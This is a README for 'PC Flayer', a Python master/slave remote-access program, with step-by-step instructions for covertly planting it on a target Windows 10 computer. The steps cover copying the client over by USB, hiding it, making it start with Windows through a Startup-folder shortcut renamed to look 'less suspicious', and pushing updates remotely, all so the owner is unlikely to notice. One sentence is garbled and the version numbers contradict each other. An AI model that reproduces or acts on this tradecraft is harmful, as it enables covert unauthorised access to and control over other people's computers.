# What is PC Flayer?
PC Flayer is a python based program that lets you have access to computers in your network. It runs in the background of your desired computer so little to no detection happens by the computer's owner. PC Flayer w if any bugs or error are found. As of currently, commands are very limited but more will be coming out for as long as I work on this project.

# DISCLAIMERS!
* PC Flayer was built for Windows 10 operating systems, I don't know how well it would work on other OS's.
* I am not responsible for any damage done to target computer because of this program. Please use this at your own risk. Do not grant any admin permissions to the program to add safety, as I coded it to run without needing admin perms.

# Prerequisites
* Python 3.10 on yours and target computer
* Python psutil library on target computer

# How to use
Here is a step by step instruction guide on how to operate this program:
1. Download PC Flayer as a zip file
2. Extract zip file to whichever location of your choice
3. Edit the slave.pyw file and enter your device's ipv4 address in the IP variable right under the VERSION variable (This can be found by typing "ipconfig" on a command prompt, scrolling all the way down, copying the "IPv4 Address" value on it and then pasting it to the variable.)
4. (Optional) Change the port of where you'd like to host the socket connection, but then you'll have to update the port also on the master.py file.
5. Make sure python 3.10 is installed on the target computer. (Python can be installed locally, meaning no admin permissions are required.)
6. Somehow find a way to get the slave.pyw file into your target computer (via a flash drive, sd card, or just copying the code from the raw slave.pyw file and pasting it in a new pyw file)
7. Hide the slave.pyw file somewhere and create a shortcut for it. Right click the shortcut and click "Cut" or "Copy".
8. On the address bar on top showing the location of the directory you are in, click it and type "startup".
9. Once in the startup folder, click Ctrl+V to paste copied slave.pyw shortcut.
10. (Optional) Rename the shortcut to whatever you want to make it look less suspicious.
11. Open the shortcut or restart the target computer to start the slave.pyw file.
12. Go back to your computer and open the master.py file (Also, make sure python 3.10 is installed on your computer, of course.)
13. Type "n" to enter operational mode. (I use testing mode to test things out on different sockets.)
14. You'll see that you connected to your target's computer when you see that a ipv4 different than the one you pasted into the IP variable has connected.
15. And congrats, you've gained access. Now type "help" for a list of available commands.

# Version
PC Flayer is currently in version 1.1.0, if your master.py is outdated, please download this file as a zip again and use the new one downloaded instead of old one. If slave.pyw is outdated, please follow instructions below how to update slave.pyw without getting out of your seat.

# Updating slave.pyw on target computer
Any PC Flayer above version 1.1.2 is able to auto update. Follow this step by step instruction to update slave.pyw without having to modify the file on target computer directly:
1. Download a new PC Flayer file as a zip file.
2. Extract zip file to whichever location of your choice.
3. Change the slave.pyw file name to update.py (If you are having trouble making the .pyw into a .py file, search for an online converter or rename it using visual studio code. For more info, view [this](https://stackoverflow.com/questions/31682903/how-can-i-change-a-py-file-to-pyw))
4. Add the update.py file to the same folder as your current master.py file.
5. Launch the master.py file and, once connected, type "update".
6. PC Flayer should send the updated file over to slave computer and PC Flayer should restart on target computer.
7. The master.py file should close and just reopen it to regain access.
8. (Optional) Once connected again, type "version" into the command section to see the current running version of PC Flayer on slave computer.
9. PC Flayer has successfully updated without you having to get up and add the slave.pyw file into the target computer again.
